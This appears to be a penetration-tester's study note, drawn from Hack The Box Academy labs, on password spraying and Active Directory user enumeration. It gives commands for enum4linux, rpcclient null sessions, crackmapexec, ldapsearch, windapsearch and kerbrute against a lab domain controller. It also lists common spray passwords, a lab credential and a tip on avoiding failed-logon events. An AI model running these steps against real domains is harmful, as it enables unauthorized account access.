Password Spraying
###################

Date: 2024-12-20 09:50:14

Status: #new

Tags: :ref:`active directory enumeration attacks`

----


Description
*************

Password spraying uses a list of usernames and attempts to connect to these 
accounts with a common password.  This is effective, especially if the system 
has password lockouts enabled.

A popular username list is (https://github.com/insidetrust/statistically-likely-usernames)
and you can combine this with your own information gathered via :ref:`osint framework`.

Selecting a common password like `Welcome1` may yield an account that you can use with Bloodhound to further enumerate 
the domain.


Account list construction example
*************************************

During your OSINT activities you discover that the username format for this
domain is F8L9 ( first 8  + last 9 ) of the user.  By running this bash loop you can 
generate 16,679,616 possible usernames. 

.. code-block:: bash

    #!/bin/bash

    for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
        do echo $x;
    done

Using this new list from your bash script, you can use this with :ref:`kerbrute` and 
enumerate every account in the domain. 

Common passwords 
******************

1. Welcome1
2. Passw0rd
3. Winter2024 

Make sure that when you are doing password spray attacks that you keep detailed logs of 

1. The accounts targeted 
2. Domain controller targeted during 
3. Date/time of the spray
4. What password(s) were attempted
   
.. danger:: Failed logon attempts create a code 4625: An account failed to log on

Some tools that can leverage SMB NULL sessions to build user lists:

1. Using :ref:`enum4linux-ng`

.. code-block:: console

    # This will find the users and create a list for
    enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

2. Using :ref:`rpcclient`

.. code-block:: console

    rpcclient -U "" -N 172.16.5.5
    rpcclient $> enumdomusers 
    user:[administrator] rid:[0x1f4]
    user:[guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[lab_adm] rid:[0x3e9]
    user:[htb-student] rid:[0x457]
    user:[avazquez] rid:[0x458]

3. Using :ref:`crackmapexec` with the --users flag

.. code-block:: console

    crackmapexec smb 172.16.5.5 --users

4. Using :ref:`ldapsearch` with anonymous

.. code-block:: console

    ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "


5. Using :ref:`windapsearch`

.. code-block:: console

    ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

Enumerating Users with :ref:`kerbrute`
*******************************************

This method is much faster and does not create an event ID of `4625: An account failed to log on` since it uses Kerberos Pre-Authentication.

Example:  Using a username list (jsmith.txt [ https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt]) with Kerbrute  

.. code-block:: console

    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
    
This will check over 48K users if 12 seconds.

Enumerating users with valid credentials
******************************************

Using  :ref:`crackmapexec`

.. code-block:: console

    sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

.. admonition::  Lockouts
    
    To prevent lockouts, it is wise to introduce a delay in your account attempts.

.. hint:: If possible ask the client for their password policy to understand the retries, and delays for your attacks.



References
************

https://academy.hackthebox.com/module/143/section/1424
https://academy.hackthebox.com/module/143/section/1455
